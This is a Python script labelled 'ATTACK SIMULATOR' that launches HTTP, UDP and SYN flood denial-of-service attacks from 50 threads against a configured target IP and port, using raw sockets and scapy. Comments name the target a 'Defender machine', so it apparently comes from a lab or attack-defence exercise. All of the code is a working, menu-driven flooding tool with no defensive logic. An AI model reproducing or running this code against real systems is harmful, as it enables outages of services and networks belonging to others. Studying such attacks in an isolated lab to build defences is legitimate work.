import threading
import requests
import socket
import random
import time
from scapy.all import IP, TCP, UDP, send

# ==========================
# CONFIG
# ==========================
TARGET_IP = "192.168.1.4"   # Defender machine IP
TARGET_PORT = 5001          # Victim service port
ATTACK_THREADS = 50         # More stable on Windows
PACKETS_PER_THREAD = 5000   # Reliable without freezing system

HTTP_TIMEOUT = 0.1

# ==========================
# HTTP FLOOD ATTACK
# ==========================
def http_flood():
    session = requests.Session()

    for _ in range(PACKETS_PER_THREAD):
        try:
            session.get(
                f"http://{TARGET_IP}:{TARGET_PORT}",
                timeout=HTTP_TIMEOUT
            )
        except:
            pass

# ==========================
# UDP FLOOD ATTACK
# ==========================
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payload = random._urandom(1024)

    for _ in range(PACKETS_PER_THREAD):
        try:
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        except:
            pass

    sock.close()

# ==========================
# SYN FLOOD ATTACK
# ==========================
def syn_flood():
    for _ in range(PACKETS_PER_THREAD):
        try:
            src_port = random.randint(1024, 65535)

            packet = (
                IP(dst=TARGET_IP) /
                TCP(
                    sport=src_port,
                    dport=TARGET_PORT,
                    flags="S"
                )
            )

            send(
                packet,
                verbose=False,
                inter=0
            )

        except:
            pass

# ==========================
# ATTACK RUNNER
# ==========================
def run_attack(attack_type):
    threads = []

    if attack_type == "http":
        attack_func = http_flood

    elif attack_type == "udp":
        attack_func = udp_flood

    elif attack_type == "syn":
        attack_func = syn_flood

    else:
        print("Invalid attack type.")
        return

    print(f"\nStarting {attack_type.upper()} flood attack...")
    print(
        f"Target: {TARGET_IP}:{TARGET_PORT} | "
        f"Threads: {ATTACK_THREADS} | "
        f"Packets/thread: {PACKETS_PER_THREAD}"
    )

    start_time = time.time()

    for _ in range(ATTACK_THREADS):
        t = threading.Thread(
            target=attack_func,
            daemon=True
        )

        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    duration = time.time() - start_time

    total_packets = ATTACK_THREADS * PACKETS_PER_THREAD

    print(
        f"{attack_type.upper()} attack completed "
        f"in {duration:.2f} sec"
    )

    print(
        f"Approx packets sent: {total_packets}"
    )

# ==========================
# MAIN MENU
# ==========================
if __name__ == "__main__":
    print("==== ATTACK SIMULATOR ====")
    print(f"Target IP: {TARGET_IP}")
    print(f"Target Port: {TARGET_PORT}")
    print("")
    print("1. HTTP Flood")
    print("2. UDP Flood")
    print("3. SYN Flood")

    choice = input("Choose attack type (1/2/3): ").strip()

    if choice == "1":
        run_attack("http")

    elif choice == "2":
        run_attack("udp")

    elif choice == "3":
        run_attack("syn")

    else:
        print("Invalid choice.")